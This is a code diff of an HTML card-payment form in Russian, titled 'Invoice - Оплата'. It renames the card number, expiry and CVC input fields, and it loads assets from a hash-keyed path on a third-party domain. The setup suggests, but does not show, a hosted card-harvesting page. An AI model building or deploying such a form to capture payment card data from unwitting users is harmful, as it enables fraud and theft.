@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <meta name="format-detection" content="telephone=no">
-  <title>Оплата</title>
+  <title>Invoice - Оплата</title>
   <link rel="apple-touch-icon" sizes="57x57" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-57x57.png">
   <link rel="apple-touch-icon" sizes="60x60" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-60x60.png">
   <link rel="apple-touch-icon" sizes="72x72" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-72x72.png">
@@ -64,7 +64,7 @@
           </div>
           <label for="pan" class="text-default font-14 mb-1">Номер карты</label>
           <div class="position-relative">
-            <input id="pan" type="tel" name="cardnumber" class="out-none text-default font-weight-bold w-100 border-0 card-text-input shadow-inset-white mb-3 p-1" autoComplete="cc-number" autocompletetype="cc-number" x-autocompletetype="cc-number" placeholder="____ ____ ____ ____">
+            <input id="pan" type="tel" name="ccnumber" class="out-none text-default font-weight-bold w-100 border-0 card-text-input shadow-inset-white mb-3 p-1" autocomplete="cc-number" autocompletetype="cc-number" x-autocompletetype="cc-number" placeholder="____ ____ ____ ____">
             <div id="errorNumber" class="d-none error-number position-absolute text-danger font-11 font-weight-bold ">
               Неверный номер карты
             </div>
@@ -73,11 +73,11 @@
           <div class="d-flex justify-content-between">
             <div class="d-flex flex-column">
               <label for="exp" class="text-default font-14 mb-1">Срок действия</label>
-              <input id="exp" type="tel" name="cc-exp" class="out-none text-default font-weight-bold border-0 card-text-input shadow-inset-white p-1" style="width: 100px" placeholder="__/__" autoComplete="cc-exp">
+              <input id="exp" type="tel" name="expdate" class="out-none text-default font-weight-bold border-0 card-text-input shadow-inset-white p-1" style="width: 100px" placeholder="__/__" autocomplete="cc-exp">
             </div>
             <div class="d-flex flex-column">
               <label for="cvc" class="text-default font-14 mb-1 ml-2">Код</label>
-              <input id="cvc" type="tel" name="cc-csc" class="out-none text-default font-weight-bold border-0 card-text-input shadow-inset-white p-1" style="width: 60px" placeholder="___" autoComplete="cc-csc">
+              <input id="cvc" type="tel" name="cvv2" class="out-none text-default font-weight-bold border-0 card-text-input shadow-inset-white p-1" style="width: 60px" placeholder="___" autocomplete="cc-csc">
             </div>
           </div>
         
